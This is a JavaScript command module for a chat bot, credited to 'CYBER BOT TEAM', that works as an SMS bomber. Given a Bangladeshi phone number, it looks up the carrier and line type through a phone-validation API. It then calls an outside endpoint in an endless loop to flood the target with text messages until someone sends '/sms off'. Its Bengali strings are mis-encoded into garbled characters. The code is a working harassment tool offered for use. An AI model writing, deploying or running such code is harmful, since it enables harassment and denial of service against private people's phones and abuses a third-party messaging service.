module.exports.config = {
  name: "sms",
  version: "2.5.0",
  hasPermssion: 0,
  credits: "CYBER BOT TEAM | Owner: Nur Nabi Khan | Email: nurnobikhan2642@gmail.com",
  description: "ржЕржиржмрж░ржд ржПрж╕ржПржоржПрж╕ ржмрзЛржорзНржмрж╛рж░, ржмржирзНржз ржХрж░рждрзЗ /sms off",
  commandCategory: "Tool",
  usages: "/sms 01xxxxxxxxx ржЕржержмрж╛ /sms off",
  cooldowns: 0,
  dependencies: { "axios": "" }
};

const axios = require("axios");
const bombingFlags = {};
const NUMLOOKUP_API_KEY = "YOUR_NUMLOOKUP_API_KEY_HERE"; // рждрзЛржорж╛рж░ API key ржмрж╕рж╛ржУ

function getFormattedDateTime() {
  const now = new Date();
  const months = ["ржЬрж╛ржирзБржпрж╝рж╛рж░рж┐", "ржлрзЗржмрзНрж░рзБржпрж╝рж╛рж░рж┐", "ржорж╛рж░рзНржЪ", "ржПржкрзНрж░рж┐рж▓", "ржорзЗ", "ржЬрзБржи", "ржЬрзБрж▓рж╛ржЗ", "ржЖржЧрж╕рзНржЯ", "рж╕рзЗржкрзНржЯрзЗржорзНржмрж░", "ржЕржХрзНржЯрзЛржмрж░", "ржиржнрзЗржорзНржмрж░", "ржбрж┐рж╕рзЗржорзНржмрж░"];
  const day = now.getDate();
  const month = months[now.getMonth()];
  const year = now.getFullYear();

  let hours = now.getHours();
  const minutes = now.getMinutes().toString().padStart(2, "0");
  const ampm = hours >= 12 ? "PM" : "AM";
  hours = hours % 12 || 12;

  return `${day} ${month} ${year} | ${hours}:${minutes} ${ampm}`;
}

async function getPhoneInfo(number) {
  try {
    const response = await axios.get(`https://api.numlookupapi.com/v1/validate/${number}?apikey=${NUMLOOKUP_API_KEY}`);
    return response.data;
  } catch (error) {
    return null;
  }
}

module.exports.run = async ({ api, event, args }) => {
  const threadID = event.threadID;
  const number = args[0];

  if (!number) {
    return api.sendMessage(
      `тАвтФДтФЕтХРтХРтХРтХРтЭБЁЯМ║тЭБтХРтХРтХРтХРтФЕтФДтАв
тШая╕П SMS BOMBER BY CYBER BOT TEAM ЁЯТг
ЁЯСд Owner: Nur Nabi Khan
ЁЯУз Email: \`nurnobikhan2642@gmail.com\`

ржмрзНржпржмрж╣рж╛рж░:
/sms 01xxxxxxxxx

(рж╢рзБржзрзБ ржоржЬрж╛рж░ ржЬржирзНржп ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзБржи)
тАвтФДтФЕтХРтХРтХРтХРтЭБЁЯМ║тЭБтХРтХРтХРтХРтФЕтФДтАв`,
      threadID
    );
  }

  if (number.toLowerCase() === "off") {
    if (bombingFlags[threadID]) {
      bombingFlags[threadID] = false;
      return api.sendMessage(
        "тЬЕ SMS ржмрзЛржорзНржмрж╛рж░ ржмржирзНржз ржХрж░рж╛ рж╣ржпрж╝рзЗржЫрзЗред\n\nЁЯСд Owner: Nur Nabi Khan\nЁЯУз Email: `nurnobikhan2642@gmail.com`",
        threadID
      );
    } else {
      return api.sendMessage("тЭЧржПржЗ ржерзНрж░рзЗржбрзЗ ржХрзЛржи ржмрзЛржорзНржмрж┐ржВ ржЪрж▓ржЫрж┐рж▓ ржирж╛ред", threadID);
    }
  }

  if (!/^01[0-9]{9}$/.test(number)) {
    return api.sendMessage(
      `тАвтФДтФЕтХРтХРтХРтХРтЭБЁЯМ║тЭБтХРтХРтХРтХРтФЕтФДтАв
тШая╕П SMS BOMBER BY CYBER BOT TEAM ЁЯТг
ЁЯСд Owner: Nur Nabi Khan
ЁЯУз Email: \`nurnobikhan2642@gmail.com\`

ржмрзНржпржмрж╣рж╛рж░:
/sms 01xxxxxxxxx

(рж╢рзБржзрзБ ржоржЬрж╛рж░ ржЬржирзНржп ржмрзНржпржмрж╣рж╛рж░ ржХрж░рзБржи)
тАвтФДтФЕтХРтХРтХРтХРтЭБЁЯМ║тЭБтХРтХРтХРтХРтФЕтФДтАв`,
      threadID
    );
  }

  if (bombingFlags[threadID]) {
    return api.sendMessage("тЭЧржПржЗ ржерзНрж░рзЗржбрзЗ ржЗрждрж┐ржоржзрзНржпрзЗ ржмрзЛржорзНржмрж┐ржВ ржЪрж▓ржЫрзЗ! ржмржирзНржз ржХрж░рждрзЗ /sms off", threadID);
  }

  const dateTime = getFormattedDateTime();

  api.sendMessage(
    `тЬЕ SMS ржмрзЛржорзНржмрж┐ржВ рж╢рзБрж░рзБ рж╣ржпрж╝рзЗржЫрзЗ ${number} ржиржорзНржмрж░рзЗ...\nЁЯХТ рж╕ржоржпрж╝: ${dateTime}\n\nЁЯУН рж▓рзЛржХрзЗрж╢ржи рждржерзНржп рж╕ржВржЧрзНрж░рж╣ ржХрж░рж╛ рж╣ржЪрзНржЫрзЗ...\nржмржирзНржз ржХрж░рждрзЗ /sms off`,
    threadID
  );

  const info = await getPhoneInfo(`+88${number}`);
  let infoText = "";

  if (info && info.valid) {
    infoText =
      `ЁЯМН рж▓рзЛржХрзЗрж╢ржи рждржерзНржп:\n` +
      `тЦк Country: ${info.country_name || "Unknown"}\n` +
      `тЦк Carrier: ${info.carrier || "Unknown"}\n` +
      `тЦк Line Type: ${info.line_type || "Unknown"}`;
  } else {
    infoText = "тЪая╕П рж▓рзЛржХрзЗрж╢ржи рждржерзНржп ржкрж╛ржУрзЯрж╛ ржпрж╛рзЯржирж┐ ржмрж╛ API Key ржнрзБрж▓ред";
  }

  api.sendMessage(infoText, threadID);

  bombingFlags[threadID] = true;

  (async function startBombing() {
    while (bombingFlags[threadID]) {
      try {
        await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${number}`);
      } catch (err) {
        api.sendMessage(`тЭМ рждрзНрж░рзБржЯрж┐: ${err.message}`, threadID);
        bombingFlags[threadID] = false;
        break;
      }
    }
  })();
};
